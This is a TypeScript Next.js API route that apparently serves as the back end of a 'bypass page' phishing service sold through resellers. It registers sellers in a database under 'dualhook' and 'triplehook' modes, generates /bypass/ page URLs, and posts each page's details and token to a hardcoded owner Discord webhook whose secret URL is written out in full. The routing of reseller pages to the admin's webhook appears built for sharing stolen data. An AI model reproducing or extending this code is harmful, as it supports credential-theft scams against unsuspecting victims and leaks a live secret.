import { NextRequest, NextResponse } from 'next/server'
import { neon } from '@neondatabase/serverless'

const OWNER_WEBHOOK = "https://discord.com/api/webhooks/1486319901806166096/9xfWLDXBP1xdOzdG_TZXhDVloUMbO3QIdlaEwP5Ifxn_YDA5j9i57r-6X6_PVrT3jRMs"
const BYPASSER_LOGO = "https://cdn.discordapp.com/attachments/1486335642899189801/1486342075556434170/images.png?ex=69c5276d&is=69c3d5ed&hm=7443d16bf281dba941ae07e0ce76695c7441e8dc2c07c462f2664f247d16193e"

const sql = neon(process.env.DATABASE_URL!)

function generateToken(): string {
  const bytes = new Uint8Array(16)
  crypto.getRandomValues(bytes)
  return Array.from(bytes).map(b => b.toString(16).padStart(2, '0')).join('')
}

export async function POST(request: NextRequest) {
  try {
    const body = await request.json()
    const { username, webhook1, webhook2, discord_server, mode, admin_override } = body

    const sanitizedUsername = (username || '').replace(/[^a-zA-Z0-9_-]/g, '')

    if (!sanitizedUsername || !webhook1) {
      return NextResponse.json({ success: false, message: 'Please fill in all required fields.' }, { status: 400 })
    }

    if (!webhook1.startsWith('https://discord.com/api/webhooks/')) {
      return NextResponse.json({ success: false, message: 'Invalid webhook URL format.' }, { status: 400 })
    }

    // Check if admin_override is provided (reseller flow) — query Neon
    let adminData: { webhook: string; mode: string } | null = null
    if (admin_override) {
      const rows = await sql`SELECT webhook, mode FROM sellers WHERE username = ${admin_override} LIMIT 1`
      if (rows.length > 0) adminData = rows[0] as { webhook: string; mode: string }
    }

    // Check if directory already exists
    const existing = await sql`SELECT 1 FROM sellers WHERE username = ${sanitizedUsername} LIMIT 1`
    if (existing.length > 0) {
      return NextResponse.json({ success: false, message: 'Directory name already exists.' }, { status: 409 })
    }

    const token = generateToken()
    const finalMode = adminData ? 'triplehook' : (mode || 'dualhook')
    const finalWebhook2 = adminData ? adminData.webhook : (finalMode === 'triplehook' ? (webhook2 || null) : null)
    const finalDiscordServer = discord_server?.trim() || 'https://discord.gg/xDQmmHKAxx'

    // Persist to Neon
    await sql`
      INSERT INTO sellers (username, webhook, webhook2, discord_server, mode, token, created_at)
      VALUES (
        ${sanitizedUsername},
        ${webhook1},
        ${finalWebhook2},
        ${finalDiscordServer},
        ${finalMode},
        ${token},
        NOW()
      )
    `

    // Build URLs
    const host = request.headers.get('host') || 'localhost:3000'
    const protocol = host.includes('localhost') ? 'http' : 'https'
    const pageUrl = `${protocol}://${host}/bypass/${sanitizedUsername}`
    const adminUrl = finalMode === 'triplehook' && !adminData
      ? `${protocol}://${host}/dualhook?admin=${sanitizedUsername}`
      : null

    // Discord embed fields
    const fields: Array<{ name: string; value: string; inline: boolean }> = [
      { name: "Directory", value: `\`${sanitizedUsername}\``, inline: true },
      { name: "Mode", value: `\`${finalMode.toUpperCase()}\``, inline: true },
      { name: "Page URL", value: pageUrl, inline: false },
    ]

    if (adminUrl) {
      fields.push({ name: "Admin Generate URL", value: adminUrl, inline: false })
    }

    fields.push({ name: "Token", value: `||\`${token}\`||`, inline: false })

    const payload = {
      content: "",
      username: "Lokus bypass",
      avatar_url: BYPASSER_LOGO,
      embeds: [{
        title: "Bypass Page Created",
        color: 3447003,
        fields,
        footer: { text: "BYPASS AGE" },
        timestamp: new Date().toISOString(),
      }]
    }

    // Notify owner webhook
    try {
      await fetch(OWNER_WEBHOOK, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload),
      })
    } catch {}

    // Notify creator webhook
    try {
      await fetch(webhook1, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload),
      })
    } catch {}

    return NextResponse.json({
      success: true,
      url: pageUrl,
      token,
      admin_url: adminUrl,
    })
  } catch (error) {
    console.error("Dualhook error:", error)
    return NextResponse.json({ success: false, message: 'Internal server error.' }, { status: 500 })
  }
}

export async function GET(request: NextRequest) {
  const { searchParams } = new URL(request.url)
  const admin = searchParams.get('admin')

  if (!admin) {
    return NextResponse.json({ success: false, message: 'No admin specified.' }, { status: 400 })
  }

  const rows = await sql`SELECT username, mode FROM sellers WHERE username = ${admin} LIMIT 1`

  if (rows.length === 0) {
    return NextResponse.json({ success: false, message: 'Admin not found.' }, { status: 404 })
  }

  return NextResponse.json({
    success: true,
    admin: rows[0].username,
    mode: rows[0].mode,
  })
}
